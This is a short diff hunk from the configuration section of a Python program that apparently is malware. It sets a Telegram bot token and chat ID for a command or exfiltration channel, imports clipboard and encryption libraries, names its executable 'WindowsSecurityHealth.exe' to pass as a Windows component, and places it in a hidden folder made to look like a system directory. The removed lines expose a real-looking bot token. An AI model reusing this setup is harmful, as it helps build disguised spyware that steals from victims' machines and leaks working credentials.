@@ -133,8 +133,8 @@ import pyperclip
 from cryptography.fernet import Fernet
 
 # === CONFIGURATION ===
-BOT_TOKEN = '7642627294:AAE8qi54AKSswU3WXph4m3CFUrIw1u6UG1Q'
-CHAT_ID = '5138427828'
+BOT_TOKEN = 'Your telegram bot API-key will go here'
+CHAT_ID = 'your telegram account chat ID go here so you can access bot privately'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 EXE_NAME = 'WindowsSecurityHealth.exe'
 HIDDEN_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'SystemHealth')
